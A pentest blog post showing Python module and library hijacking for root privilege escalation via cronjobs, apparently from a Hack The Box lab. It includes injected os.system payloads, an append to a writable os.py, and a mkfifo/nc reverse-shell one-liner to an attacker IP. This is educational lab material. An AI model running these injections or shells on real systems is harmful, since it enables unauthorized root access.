---
layout: post
title: Python - Module and Library Hijacking [eng]
author: 0xSaiyajin
tags: [pentest,privilege-escalation, linux]
categories: [pentest]
---

Greetings. This one is my first blog post about penetration testing. I encountered with this scenario on **Hack The Box**.
This machine is currently active. Hence, I can't tell its name. 

Before starting, I want to make some explanations.

While I was researching about manipulation of libraries, I saw that people were saying that this method looked like "DLL Hijacking".

At First, we need to know the differences between module and library structures. 


## Module Hijacking

**Module** is a file which contains variables, functions etc. 
It is useful if you don't want to put all classes in one file. Let's assume that you created a folder named as **test-project**. Then, you created **a.py** and **b.py** files in it. 
Your project structure will look like this:

```
/test-project
   a.py
   b.py
```

Then, you decided to call a function from **b.py** on **a.py** file.
The **__init__.py** file is necessary for marking the directories on disk as Python package directories. If you try to put module **b** into subdirectory you supposed to append **__init__.pt** file to parent directory.
Without that file, importing is going to fail. It means that for linking these files you have to append **__init__.py** file to your structure if you want to build a package from your project.

```
/test-project
   a.py
   b.py
   __init__.py
```

Now, **a.py** and **b.py** files turned into modules. We can call functions from **a** on **b** and vice versa. By the way, it is not necessary to add **__init__.py** file to this examples. Finally, you added example functions to both of them.

![module a b]({{site.url}}/assets/images/library_hijacking/module_a_b.png)

Here's the output of **a.py**.

![module output]({{site.url}}/assets/images/library_hijacking/module_output_clean.png)

Okay, let's convert this situation to a scenario. We need more realistic file names.

The scenario goes like this:
Root user created a cronjob script for itself to easily manage the service logs. 
It works at every hour.

![scenario struct]({{site.url}}/assets/images/library_hijacking/module_scenario_project_struct.png)

As you can see, **interface.py** created by root. Sadly, we can't modify this file.

![interface]({{site.url}}/assets/images/library_hijacking/module_scenario_interface.png)

Quick analyze of interface.py: 


- It is importing "manage.py" file.
- It is using three functions from "manage.py" module.
- We can't change any line of this script. 


Okay, stop reading this post for a while. Just think about what we can do with this file for achieving root privileges.

It just seems like we can only execute it.

![interface output]({{site.url}}/assets/images/library_hijacking/module_scenario_running_interface.png)

We are done with **interface.py** file. It is importing **manage.py** file. Time has come to analyze the **manage.py** module.

![manage output]({{site.url}}/assets/images/library_hijacking/module_scenario_manage.png)

Quick analyze of manage.py:

- The first function is creating a new file named "system\_0.log".
- The second function is changing the context of log file.
- The third function is removing the "system\_0.log" file with using "os.remove()" function.
- So, it is importing "os" library.


We are going to hijack **manage.py** module. 
The first possible injection point is functions of **manage.py**.

We can inject our malicious code into functions. I'm selecting the "change\_context\_log" functions.

```
cmd=os.popen("id").read()
fd.write(cmd)
```

![manage inject function]({{site.url}}/assets/images/library_hijacking/module_scenario_manage_inject_function.png)

![manage inject function out]({{site.url}}/assets/images/library_hijacking/module_scenario_injected_function_run.png)

The second injection point is outside of functions. We know that ```import manage``` line gave access to pushing some code.

We need to inject this code to bottom of the **manage** module. Also, we have to write output to another file. According to code flow, injected code will run first, then functions will be executed. Hence, output file will be overwritten.

```
os.system('id > system_1.log');
```


![manage inject out]({{site.url}}/assets/images/library_hijacking/module_scenario_manage_inject_out.png)


It will give same output with the last output.

What's next? Okay, we know that this script is working as cronjob for root user. At every hour, our injected code will work with root privileges. So, we can run privileged commands. We can even gain root shell.

Malicious Code:

```os.system('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.15.93 9898 >/tmp/f');```


I changed the cron time to 2 minutes.
After waiting, we got root shell.

![root_shell]({{site.url}}/assets/images/library_hijacking/module_scenario_gotroot.png)


## Library Hijacking

I hope you understood how modules works. 
The difference between module and library is you don't have to create **__init__.py** file for your project. Because, Python initializes these libraries on its own package directory. So, we can reach to these libraries even with "-c" parameter of Python. For example if you want to check UTC timestamp with Python on terminal, so you can call this script. 

```python -c "import time;print time.time()"```


Also, if you want to check where are these package files are stored at, then you can run this script:

```python -c "import sys;print sys.path"```

![libr_python_libraries]({{site.url}}/assets/images/library_hijacking/libr_python_libraries.png)


As you see, I used time and sys libraries in my examples. We continue with a similar scenario.

This time, attacker does not know what's going on at the machine. At least he is in the machine.
He wants to do process monitoring for analyzing the hidden processes. And he uses [pspy](https://github.com/DominicBreuker/pspy) tool.

After running the tool, he sees that a Python script is running on the machine at every two minutes.

![libr_pspy_output]({{site.url}}/assets/images/library_hijacking/libr_pspy_output.png)

The adventure begins as an attacker. 

Okay, we see there is another cronjob running on our target machine. If we check cronjob list for current user, we can see there is no entry for user **goku**. It could mean that the running script could be root user's cronjob. 

![libr_crontab_for_user]({{site.url}}/assets/images/library_hijacking/libr_crontab_for_user.png)

```
/bin/sh -c /usr/bin/python2 /home/goku/Desktop/LibraryInjection/saiyajin.py
```

Maybe, we should check this directory. There could be some juicy data. 
After checking this directory, we can see that there is nothing but Python script.
We have no permission for appending anything to the script. 

![libr_append_fail]({{site.url}}/assets/images/library_hijacking/libr_append_fail.png)

```-rw-r--r-- : chmod 644```

It means that "dumb" root user learned his lesson from his mistakes. Surprisingly, it looks pretty secure. We should have a look inside this script. 

![libr_running_script]({{site.url}}/assets/images/library_hijacking/libr_running_script.png)

Okay, it's pretty funny. That "dumb" developer might have tried something. But, he may have forgotten to remove this file. 

Quick analyze of saiyajin.py:

- He created tiny hello world script. We are not sure what he was trying to achieve.
- He was trying to use echo command with bash. "os.remove()" method was used to take this action.
- "os.remove()" method has commented out.
- It could be test script of another program.
- "os" library has imported.


Cool. We don't have a module to hijack this time. What do we have? Correct! **A library**.
Actually, libraries are modules too. But, the main difference between them is you can call libraries from anywhere. 

Let's make it more clear. I want you to think about the module example we did. Can we call **b** module from outside of the project folder? Yeah, probably. But we had to move this project folder to where we wanted to call **b** module from. Furthermore, if we go to parent directory of **test-project** directory, we will not be able to call **b** module. If we want to call it from parent directory, we must add one more **__init__.py** file.

It will look like this:

```
/parent-directory
   __init__.py
   /test-project
      __init__.py
      a.py
      b.py
```

Okay. Now, we can call **b** module, but not from everywhere. Another option is turning this **test-project** into Python package. Then, we can call **b** module from everywhere.

After this process, user can call function from **b** module with this way:

```python -c "import testproject; print testproject.b.examplefunction()"```

But, we don't need all of this. Because, we know that the developer has imported the **os** library in his code. As I said, we don't have a module to hijack this time. Even so, we have a library. When you install Python libraries they are installed with **644** file permission. It means only root user can make changes on these libraries. Other users can only read these files. Sometimes, people may give wrong permissions to Python library folders.

If so, we should check library folders.

![libr_writable_python_library]({{site.url}}/assets/images/library_hijacking/libr_writable_python_library.png)

Bingo! We have permission to write into **os.py** file. Pathetic, right? At least, "dumb" developer has gave wrong permission to only one library. We are going to turn it into a weapon.

To show this example, I will write the output to a text file.

![libr_write_to_library]({{site.url}}/assets/images/library_hijacking/libr_write_to_library.png)

```echo "system('id >> /tmp/id_out.txt');" >> os.py```

So, we appended our malicious code to bottom of the **os.py** file.

Have you noticed why I used **system()** method instead of **os.system()** method ?
Because, writing "os.system()" in it will give error. We are in "os" itself. It will not recognize "os." part. Also, **system()** method is already defined in here. So, we should use "system()" instead of "os.system()". In addition, appending ```import os``` line to this file may cause to infinite recursion.

Now, it seems okay.

We set our trap and we are waiting for cronjob. If our assumptions are correct, **everything will be fine**. The malicious code will execute ```id``` command and it will append the output to **/tmp/id_out.txt** file.

After waiting a little, we achieved to execute command as root.

![libr_priv_esc]({{site.url}}/assets/images/library_hijacking/libr_priv_esc.png)

In this part, we benefited from running cronjob for obtaining root privileges. 
This scenario is more dangeroues than "module hijacking" scenario. Because each time you call the **os** module the injected code will be executed. Possibility of calling the **os** module is higher than calling the **b** module. Even root user may call it.


## tl;dr

Avoid giving privileged permissions to Python files.
